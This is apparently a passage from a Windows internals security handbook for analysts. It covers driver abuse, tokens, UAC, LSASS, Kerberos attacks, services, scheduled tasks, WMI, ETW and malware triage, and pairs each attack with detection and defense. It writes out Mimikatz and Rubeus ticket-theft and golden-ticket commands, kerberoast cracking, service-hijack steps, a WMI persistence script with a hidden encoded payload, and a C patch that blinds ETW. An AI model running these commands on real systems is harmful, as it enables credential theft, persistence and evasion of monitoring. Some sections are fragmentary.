  1. Find a legitimate, Microsoft-signed driver with a vulnerability (many old drivers have kernel memory read/write from user space)
  2. Drop and load this legitimate driver (it loads because it's signed)
  3. Exploit the driver's vulnerability to gain kernel-level arbitrary read/write
  4. Use that kernel access to load your unsigned malicious driver OR to modify kernel memory directly (disable DSE, inject code, steal tokens)
💀 Real-World: BlackByte Ransomware BYOVD

BlackByte ransomware (observed 2022-2023) used the legitimate RTCore64.sys driver from MSI Afterburner (a GPU overclocking tool). This driver had a kernel memory read/write vulnerability. BlackByte loaded it silently, used its vulnerability to write to kernel memory and disable Windows security callbacks (PsSetCreateProcessNotifyRoutine callbacks from EDR products), effectively making the EDR blind. Then it deployed ransomware payload with no EDR interference. The signed driver had no malware in it, it was a legitimate tool with a known security flaw. Microsoft has since revoked its certificate and added it to the vulnerable driver block list.

🛡️ Detection and Defense: Driver-Based Attacks

Microsoft's Vulnerable Driver Blocklist: Windows 11 and Server 2022 with Hypervisor-Protected Code Integrity (HVCI) enforce a blocklist of known-vulnerable drivers. Enable HVCI in security settings. Event ID 7045 in the System log records every new service/driver installation, alert on this in your SIEM. Sysmon Event ID 6 logs driver loads with hash, compare against known-vulnerable driver hashes. LOLDrivers.io maintains a public database of known vulnerable drivers with hashes. Kernel ETW callbacks: Modern EDRs use PsSetLoadImageNotifyRoutine to detect driver loads before they execute.

Windows Security Model

Tokens, ACLs, integrity levels, and why privilege escalation works

🔐
💬 From the Desk

The Windows security model is actually beautifully designed. When you understand access tokens and the Security Reference Monitor, you'll see that most privilege escalation attacks aren't "magic", they're very logical exploitations of specific properties of this model. Mimikatz, UAC bypasses, token impersonation, all of it falls out of the security model's design. Understand the model, and the attacks make perfect sense.

🎫 The Access Token, Your Security Identity

Every process and thread in Windows carries an access token, think of it like a badge that the Security Reference Monitor (SRM) checks every time you try to access a resource. The token is a kernel object that contains all the information the SRM needs to make an authorization decision.

🎫 Access Token Structure

⚖️ How the SRM Makes Access Decisions

When a process tries to access a resource (open a file, read a registry key, query a process), Windows performs an access check. The Security Reference Monitor (SRM) is the kernel component that performs this check. Here's exactly how it works:

  1. The requesting thread's token is retrieved (including any impersonation token if the thread is impersonating)
  2. The resource's Security Descriptor is retrieved, which contains the DACL (Discretionary Access Control List)
  3. The SRM walks the DACL entries (ACEs, Access Control Entries) in order
  4. For each ACE, it checks if the ACE's SID matches any SID in the token
  5. If an Allow ACE matches and grants the requested access, access granted
  6. If a Deny ACE matches, access denied immediately (Deny ACEs take priority over Allow)
  7. If no ACE matches, access denied (implicit deny)
  8. Integrity level check: the subject's IL must be >= the object's IL (No Write Up policy)

🚦 Integrity Levels, Windows Mandatory Integrity Control

Integrity levels (IL) are a mandatory access control mechanism added in Windows Vista. They sit on top of the discretionary ACL system. Even if a DACL grants access, the IL check can still block it.

This is why, even if you're running as a local admin, your processes run at Medium IL by default, UAC strips the admin token to a limited token. Elevation to High IL requires either UAC consent or an explicit token manipulation.

🚪 UAC Internals, How Elevation Actually Works

When a standard user or even an admin runs an elevated process, here's what happens under the hood:

  1. The application manifest requests elevation (requestedExecutionLevel = requireAdministrator), or the user right-clicks "Run as Administrator"
  2. AppInfo service receives the elevation request
  3. AppInfo calls the Consent UI (consent.exe), this is the UAC dialog running in a secure desktop (isolated from the regular desktop, can't be spoofed by other applications)
  4. The user clicks "Yes", consent.exe creates a new primary token with the full admin privileges (High IL), linked to the user's elevated token
  5. The process launches with this elevated token

UAC Bypass Techniques

Many auto-elevating Windows components bypass the UAC dialog entirely because they're trusted system components. Attackers find ways to make these auto-elevating processes run their code. Common bypasses:

⚡ Dangerous Privileges, Attack Chains

SeDebugPrivilege, The Keys to the Kingdom

SeDebugPrivilege allows a process to open any other process on the system, regardless of its security descriptor. With this privilege: open LSASS, read its memory, extract credentials. Open any process, inject code. This is what Mimikatz's sekurlsa::logonpasswords uses. Administrators have this privilege but it's disabled by default, you must explicitly enable it.

SeImpersonatePrivilege, Potato Attacks

SeImpersonatePrivilege allows a thread to impersonate another security context. Service accounts typically have this (it's needed for legitimate operations). Attackers exploit this with the "Potato" family of privilege escalation attacks (RottenPotato, JuicyPotato, SweetPotato, etc.):

  1. Attacker code running as a service account creates a named pipe
  2. The attacker tricks a SYSTEM-level process into connecting to that named pipe
  3. The attacker calls ImpersonateNamedPipeClient(), with SeImpersonatePrivilege, this gives them the SYSTEM-level impersonation token
  4. Call CreateProcessWithTokenW() with the SYSTEM token → new process running as SYSTEM

Token Impersonation and Mimikatz

Mimikatz's token::elevate command walks the process list, finds a process running as SYSTEM (like winlogon.exe), opens it with SeDebugPrivilege, duplicates its token with DuplicateTokenEx(), and calls ImpersonateLoggedOnUser() or SetThreadToken(). The current thread now runs with SYSTEM identity. From there: sekurlsa::logonpasswords opens LSASS and reads credentials.

🔑 LSASS Internals, Where Credentials Live

LSASS (Local Security Authority Subsystem Service, lsass.exe) is the crown jewel of Windows credential storage. It:

  • Manages interactive logon sessions
  • Stores NTLM hashes in memory for the duration of a logon session
  • Stores Kerberos tickets (TGT and service tickets)
  • If WDigest is enabled (or in older Windows): stores cleartext passwords in memory
  • Manages LSA secrets and cached domain credentials

🛡️ Protecting LSASS

LSASS Protected Process Light (PPL): Enable via HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1. This makes LSASS a protected process, only protected processes can open it. Mimikatz's standard sekurlsa module fails. Attackers respond with kernel-level attacks (PPL bypass via vulnerable drivers).

Disable WDigest: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest → UseLogonCredential = 0. This prevents cleartext passwords from being stored in LSASS memory. Default in Windows 8.1+ but verify it's not been re-enabled by attackers.

⚔️ Kerberos Attack Techniques, The Internals

Pass-the-Ticket (PtT)

Kerberos tickets are stored in memory by the LSASS process. With Mimikatz or Rubeus, you can export these tickets (.kirbi files) from memory and import them on another machine. The KDC issued the ticket to the original machine, but when you present a valid ticket to a service, the service decrypts it with its own key, it doesn't verify which machine presented it (there's no client IP in the ticket).

mimikatz # kerberos::list /export    # Export all tickets to .kirbi files
mimikatz # kerberos::ptt ticket.kirbi # Import ticket on another machine

Rubeus.exe dump /service:krbtgt       # Dump TGTs
Rubeus.exe ptt /ticket:base64...      # Pass a ticket

Kerberoasting

Any authenticated domain user can request a service ticket for any service with an SPN (Service Principal Name). The ticket is encrypted with the service account's NT hash. If the service account has a weak password, an offline dictionary attack against the ticket will recover the password.

# Request service ticket for all SPNs (any domain user can do this)
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Crack offline with Hashcat
hashcat -m 13100 hashes.txt wordlist.txt   # TGS-REP hash type

# Detection: Event ID 4769 with Ticket Encryption Type 0x17 (RC4)
# Modern services use AES256 (0x12), RC4 requests from user accounts are suspicious

AS-REP Roasting

Accounts with "Do not require Kerberos preauthentication" enabled skip step ① of the AS exchange (the timestamp encrypted with the password hash). Without preauthentication, anyone can send an AS-REQ for that account and receive an AS-REP containing a ticket encrypted with the account's hash, no password needed to request it. That encrypted blob is then crackable offline.

Golden Ticket, Domain Persistence

The Golden Ticket is the most powerful Kerberos attack. If an attacker obtains the krbtgt account's NT hash (from DCSync or domain controller compromise), they can forge TGTs for any user, with any group memberships, with any expiry time. The KDC encrypts TGTs with the krbtgt hash, so if you have that hash, you can create perfectly valid TGTs that the DC will accept.

# Step 1: Get krbtgt hash (requires DC admin or DCSync rights)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Step 2: Create Golden Ticket for any user (even nonexistent ones)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
    /sid:S-1-5-21-... /krbtgt:HASH_HERE /id:500 /ptt

# Now you have a TGT for Domain Administrator
# Valid until krbtgt password is changed TWICE

Silver Ticket, Stealthier, Service-Specific

A Silver Ticket is a forged service ticket (not a TGT). It's encrypted with the service account's NT hash (not krbtgt). The advantage: Silver Tickets are never presented to the DC, only to the service. This means DC logs will show nothing. The disadvantage: it only works for the specific service whose hash you have.

Windows Services & the SCM

The background engine room of Windows, and one of malware's favorite hiding spots

If processes are the workers and threads are their hands, services are the permanent staff. They start when Windows boots, run without a logged-in user, and many run as SYSTEM. That combination, high privilege, invisible to the average user, auto-start, makes services a prime target for persistence and privilege escalation.

The Service Control Manager (SCM)

The SCM lives in services.exe (PID typically 684 on a clean system). It is the gatekeeper: it reads service configuration from the registry, starts/stops services, monitors their health, and handles failure actions (restart, run a program, reboot). Every service interaction, whether from an admin or an attacker, goes through the SCM via RPC.

📌 Key Registry Location
HKLM\SYSTEM\CurrentControlSet\Services\

Every service has a subkey here. The most forensically important values: ImagePath (what binary runs), Start (0=Boot, 1=System, 2=Auto, 3=Manual, 4=Disabled), Type (0x10=own process, 0x20=shared process, 0x1=kernel driver), ObjectName (which account runs it).

svchost.exe: The Great Consolidator

Running 60 services as 60 separate processes wastes memory. Microsoft's solution: svchost.exe, a generic host process that loads service DLLs and runs them in shared process groups. One svchost can host dozens of services.

How does svchost know which DLL to load? The service's registry key has a Parameters\ServiceDll value pointing to the actual implementation DLL. svchost reads this, loads the DLL, and calls its ServiceMain() export.

⚠️ Forensic Alert: Fake svchost
Legitimate svchost.exe always has services.exe as its parent. If you see svchost with a different parent, or running from anywhere other than C:\Windows\System32\, that's a red flag. Malware frequently names itself svchost.exe and drops it in Temp or AppData.

Service DACLs: The Hidden Attack Surface

Every service object has a DACL, a permissions list controlling who can start, stop, query, or modify it. By default, most services are locked down. But misconfigurations happen, and when they do, an attacker with a low-privilege shell can reconfigure a service to run their payload as SYSTEM.

🔧 Checking Service Permissions
sc sdshow wuauserv, shows the SDDL descriptor
accesschk.exe -uwcqv "Everyone" *, finds services writable by Everyone
accesschk.exe -uwcqv "BUILTIN\Users" *, writable by regular users

Service Binary Hijacking

If a low-privilege user can overwrite the binary that a service runs, they can replace it with a payload and then restart the service to execute as whatever account the service uses, often SYSTEM. This is one of the cleanest privilege escalation paths in Windows.

⚔️ Attack: Service Binary Hijacking
Condition: Service binary is writable by a non-admin user.

Steps:
1. accesschk.exe -wvu C:\VulnerableApp\service.exe, confirm write access
2. Replace service.exe with a payload (e.g., reverse shell or adduser binary)
3. sc stop VulnService && sc start VulnService
4. Payload executes as SYSTEM

MITRE: T1574.010 - Services File Permissions Weakness

Unquoted Service Paths

If a service's ImagePath contains spaces and isn't quoted, Windows tries to resolve it by guessing where the executable boundary is. For a path like C:\Program Files\Vulnerable App\service.exe, Windows tries these in order:

  • C:\Program.exe
  • C:\Program Files\Vulnerable.exe
  • C:\Program Files\Vulnerable App\service.exe

If an attacker can write to C:\Program Files\, they plant Vulnerable.exe there and win. This is a classic finding in privilege escalation challenges, and in real enterprise environments.

⚔️ Attack: Unquoted Service Path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
Filter results for paths with spaces and no quotes. Check write access on intermediate directories.

• Audit service DACLs quarterly with accesschk or PowerShell

Scheduled Tasks & WMI

Windows' built-in cron, and the rootkit hiding inside your management framework

Persistence is the attacker's second goal after initial access. Two mechanisms built into every Windows installation make persistence trivially easy: Scheduled Tasks and WMI event subscriptions. Both survive reboots. Both are "legitimate" features. Both are invisible to most users. Let's tear them apart.

Scheduled Tasks: The Task Scheduler Service

The Task Scheduler service (Schedule, running as svchost -k netsvcs) reads task definitions from two places:

  • Disk: C:\Windows\System32\Tasks\, XML files, one per task
  • Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\, binary blob (the "Task Cache")
⚠️ The Task Cache Trick
An attacker who only creates the registry entry (no XML file) can create a "ghost task" that appears in the Task Cache but not in the Tasks folder. Some older EDR tools only scan the XML files and miss it. Modern approach: always check both locations and compare.

Anatomy of a Task XML

Task XML files are human-readable and forensically rich. Key elements to understand:

<Task>
  <Triggers>
    <LogonTrigger>...</LogonTrigger>   <!-- Run at logon -->
    <TimeTrigger>...</TimeTrigger>     <!-- Run at time -->
    <EventTrigger>...</EventTrigger>   <!-- Run on Event ID -->
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-enc [base64 payload]</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>  <!-- SYSTEM SID -->
      <RunLevel>HighestAvailable</RunLevel>

</Task>

Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"} | Select-Object TaskName, TaskPath, State

schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

WMI: The Management Framework That Became a Rootkit

Windows Management Instrumentation is a massive framework for querying and managing Windows. Every sysadmin uses it: wmic process list, Get-WmiObject Win32_LogicalDisk. But buried inside WMI is a persistence mechanism so stealthy that the APT group behind Operation Skeleton Key used it to hide for years.

WMI's core database lives at C:\Windows\System32\wbem\Repository\ in binary files: OBJECTS.DATA, INDEX.BTR, and MAPPING*.MAP. The WMI service (winmgmt) reads these files. The database persists across reboots. The repository is not a text file, it's a binary object store. Most forensic tools can't read it without special tooling.

WMI Permanent Event Subscriptions: The Persistent Backdoor

WMI can fire arbitrary commands when Windows events occur, and these subscriptions survive reboots because they're stored in the WMI repository. The attacker needs three objects:

  1. __EventFilter, WQL query defining the trigger (e.g., "run every time a user logs on")
  2. __EventConsumer, what to do (e.g., run a command via CommandLineEventConsumer)
  3. __FilterToConsumerBinding, glues the two together
⚔️ Attack: WMI Persistence via PowerShell
# Create the Event Filter (trigger: user logon)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemHealthCheck"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
}

# Create the Consumer (action: run payload)

    Name = "SystemHealthCheck"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -enc [BASE64_PAYLOAD]"
}

# Bind them
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}

Windows Networking Internals

How packets move through Windows, and where attackers intercept them

Understanding Windows networking from the inside, not just "TCP/IP but in Windows", is what separates a junior analyst from someone who can explain why a C2 beacon survives a firewall block, or why DNS tunneling is so effective. Let's go from socket to wire.

The Windows Network Stack

Windows uses a layered networking architecture. Each layer has its own driver model, its own extension points, and its own attack surface.

Key Layers Explained

Winsock (ws2_32.dll): The user-mode API applications call. When your browser calls connect(), it goes here first. Legacy Layered Service Providers (LSPs) could intercept Winsock calls, malware used this for traffic interception. LSPs are deprecated in modern Windows but sometimes still found on older systems.

AFD.sys (Ancillary Function Driver): The kernel-mode backing store for Winsock. Manages socket state, buffers, and the IRP interface between Winsock and the TCP/IP stack. When you call send() in user mode, AFD.sys eventually receives an IRP and hands it to tcpip.sys.

Windows Filtering Platform (WFP): This is where Windows Firewall and most EDR network inspection happens. WFP exposes "callout" hook points at various layers of the network stack. Third-party drivers (firewalls, EDR agents, VPNs) register callouts and can inspect, modify, or block packets. This is also where sophisticated malware tries to register its own callout to intercept traffic before the firewall sees it.

Named Pipes & SMB

Named pipes are an IPC (inter-process communication) mechanism that appears as a file path: \\.\pipe\PipeName. They use the same I/O model as files but transmit data between processes, even over the network via SMB.

SMB (Server Message Block) is Windows' native file-sharing protocol. It runs over TCP port 445 and uses named pipes internally for many remote operations. When you run net use to mount a share, or when a domain controller authenticates you, SMB is involved.

⚔️ Attack: Named Pipe Impersonation (Privilege Escalation)
A low-privilege process creates a named pipe server and tricks a high-privilege process into connecting to it. The server then calls ImpersonateNamedPipeClient() to steal the high-privilege token. This is the foundation of Potato attacks (RottenPotato, JuicyPotato, etc.).

Requirement: SeImpersonatePrivilege (often held by IIS, SQL Server, and service accounts)
MITRE: T1134.001 - Token Impersonation/Theft

DNS Internals & DNS Tunneling

Windows DNS resolution order: local cache → hosts file (C:\Windows\System32\drivers\etc\hosts) → DNS cache (via dnscache service) → configured DNS server. The DNS client service batches and caches queries; you can flush it with ipconfig /flushdns.

DNS tunneling exploits the fact that DNS traffic is almost never blocked. An attacker registers a domain they control (evil.com), runs a DNS server for it, and encodes data in DNS queries. The compromised host sends queries like aGVsbG8gd29ybGQ.evil.com (base64 data as a subdomain). The attacker's DNS server decodes it. Responses carry data back as DNS answers.

⚔️ Attack: DNS Tunneling C2
Tools: dnscat2, iodine, custom PowerShell scripts

Detection indicators:
• Unusually long DNS query names (legitimate hostnames rarely exceed 30 chars; tunneling queries may be 200+ chars)
• High volume of queries to a single domain
• Queries for random-looking subdomains (high entropy)
• No corresponding HTTP/HTTPS traffic (data moving only via DNS)
• Queries using unusual record types (TXT, NULL, CNAME for data)

MITRE: T1071.004 - Application Layer Protocol: DNS
🛡️ Defense: Network Monitoring
• WFP callout audit: New callout drivers appearing in the kernel are suspicious, monitor driver loads with Sysmon Event ID 6
• DNS logging: Enable DNS debug logging or deploy DNS over HTTPS with a filtering resolver; log all DNS queries
• Named pipe forensics: pipelist.exe (Sysinternals) enumerates active pipes; Sysmon Event ID 17/18 logs pipe creation and connection
• SMB audit: Windows Event IDs 5140 (share access), 5145 (share object access check) for lateral movement detection
• NetFlow / packet capture: Baseline DNS query volume per host; alert on 3σ deviations

Event Logging, ETW & Sysmon

Windows' telemetry backbone, and how attackers try to go blind

Logs are the analyst's evidence. But Windows logging is a maze, three separate subsystems, hundreds of channels, thousands of Event IDs, and an attacker who knows exactly which ones to disable. This chapter maps the entire telemetry landscape and tells you what actually matters.

The Three Logging Subsystems

1. Windows Event Log (WEL): The classic logging system. Events are written to .evtx binary files in C:\Windows\System32\winevt\Logs\. The Event Log service (eventlog) manages them. Key channels: Security, System, Application, and hundreds of operational logs.

2. Event Tracing for Windows (ETW): A high-performance kernel-level tracing framework. Providers (both kernel and user-mode) emit events at very high speed. Consumers (EDR agents, performance tools, WEL itself) subscribe to specific providers. ETW is how Windows Defender and most modern EDRs get their telemetry, it's far richer than WEL.

3. Sysmon (System Monitor): A Sysinternals tool that installs as a kernel driver and ETW consumer, then writes enriched events to the Microsoft-Windows-Sysmon/Operational channel. It provides process creation with command lines, network connections, file hashes, registry changes, and much more, things WEL alone doesn't capture.

Critical Security Event IDs (The Analyst's Hit List)

ETW: How EDRs Actually See Everything

Windows Defender, CrowdStrike, SentinelOne, they don't just parse WEL. Their kernel drivers register as ETW consumers for providers like:

  • Microsoft-Windows-Kernel-Process, process/thread creation
  • Microsoft-Windows-Kernel-File, file I/O
  • Microsoft-Windows-Kernel-Network, network connections
  • Microsoft-Windows-DotNETRuntime.NET method invocation (catches C# implants)
  • Microsoft-Windows-PowerShell, script block logging
⚔️ Attack: ETW Blinding (Patching ETW in Memory)
ETW works because NtTraceEvent() is called in every process. Sophisticated malware patches the ETW function in ntdll.dll within its own process, replacing the first bytes with a RET instruction. This makes the process invisible to ETW consumers (EDR) while keeping system-wide ETW intact.

// ETW patch in C (simplified)
HMODULE hNtdll = GetModuleHandle("ntdll.dll");
FARPROC pEtwFunc = GetProcAddress(hNtdll, "NtTraceEvent");
DWORD oldProt;
VirtualProtect(pEtwFunc, 1, PAGE_EXECUTE_READWRITE, &oldProt);
*(BYTE*)pEtwFunc = 0xC3; // RET - silences ETW in this process
VirtualProtect(pEtwFunc, 1, oldProt, &oldProt);
MITRE: T1562.006 - Impair Defenses: Indicator Blocking

PowerShell Logging

PowerShell is the attacker's favorite living-off-the-land tool. Without logging, powershell.exe -enc [base64] leaves no trace of what was executed. With proper logging, you capture the decoded script even if it's obfuscated.

There are three tiers of PowerShell logging, each more verbose than the last:

  • Module Logging (Event ID 4103): Logs pipeline execution and module activity
  • Script Block Logging (Event ID 4104): Logs the decoded content of script blocks, catches obfuscated code after deobfuscation. This is the most valuable one.
  • Transcription: Writes full session input/output to text files on disk

Sysmon's events fill the gaps that native Windows logging leaves. Install it with a tuned config (SwiftOnSecurity or olafhartong's modular config are standard starting points) and suddenly you have process creation with full command lines and hashes, network connections with parent process context, and registry modification events.

Malware Analysis on Windows

Reading what the attacker shipped to your endpoint

Everything in this handbook so far has been building toward this: understanding what malware actually does when it lands. Process hollowing makes sense now. DLL injection makes sense. Token impersonation makes sense. Now let's put it together, the anatomy of a modern Windows implant and how to analyze it.

The Modern Malware Architecture

Modern malware is rarely a single executable that does everything. It's a staged architecture: a small initial payload (Stage 0/Stager) that fetches and loads a larger payload (Stage 1/Implant). This keeps the initial dropper small and bypasses signature detection.

Static Analysis: Reading the PE Without Running It

Static analysis examines the malware file without executing it. Key techniques:

  • String extraction: strings malware.exe or FLOSS (deobfuscates encoded strings). Look for: URLs, IP addresses, registry keys, API function names, error messages.
  • Import table analysis: Which APIs does it import? VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = classic injection. CryptEncrypt + FindFirstFile = likely ransomware.
  • PE header examination: Section names, entropy (high entropy = packed/encrypted), timestamp (often spoofed), rich header analysis.
  • Hash lookups: MD5/SHA256 on VirusTotal. Also check the Import Hash (imphash), identifies malware families with the same import structure even with different code.

Dynamic Analysis: Watching It Run

Dynamic analysis executes the malware in a controlled environment and observes its behavior. The gold standard is running it in a sandbox (Cuckoo, ANY.RUN, Joe Sandbox) while monitoring:

  • Process creation (what processes does it spawn?)
  • Network connections (C2 IP/domain, beacon interval, protocol)
  • File system changes (what does it drop? where?)
  • Registry modifications (persistence keys)
  • API calls (Procmon, API Monitor)

Anti-Analysis Techniques

Malware authors know analysts use sandboxes. They implement checks to detect analysis environments and behave differently:

⚔️ Common Anti-Analysis Tricks
Sandbox detection:
• Check number of running processes (sandboxes have few)
• cpuid instruction, VMware/VirtualBox leave fingerprints in CPU flags
• Check for common analysis tools: Wireshark.exe, Procmon.exe, x64dbg.exe in process list
• Screen resolution check, sandboxes often run at 800×600
• User activity check, no mouse movements or keystrokes = sandbox
• Sleep calls with long delays, sandbox timeout evasion

Anti-debug:
• IsDebuggerPresent() / CheckRemoteDebuggerPresent()
• NtQueryInformationProcess with ProcessDebugPort
• Timing attacks (RDTSC, execution too fast = debugger)
• Parent process check, debuggers are the parent; legitimate process should be Explorer or CMD

LOLBins: Living Off The Land

LOLBins (Living Off the Land Binaries) are legitimate Windows executables that attackers misuse to run payloads, download files, or bypass security controls. They're signed by Microsoft, so they often pass application whitelisting. Key ones every analyst must know:

The Analyst's Triage Checklist

🛡️ Incident Response First 15 Minutes
1. Scope: Is this one machine or many? Check lateral movement indicators.
2. Process tree: Who spawned what? Parent-child relationships tell the story.
3. Network: What's calling home? Beacon intervals? DNS queries to unknown domains?
4. Persistence: Hunt the 10 registry run keys. Check scheduled tasks and services.
5. Credentials: Was LSASS accessed? (Sysmon 10) Any 4648 events?
6. Logs intact? Check 1102 and 104. If logs are cleared, assume worst case.
7. Timeline: First artifact timestamp → current → rebuild the kill chain.
8. Contain: Isolate, but preserve memory if possible (memory dump first).
9. Indicators: Extract hashes, IPs, domains, mutex names, registry keys.
10. Communicate: Escalate with facts, not assumptions. What do you know vs. what do you suspect?
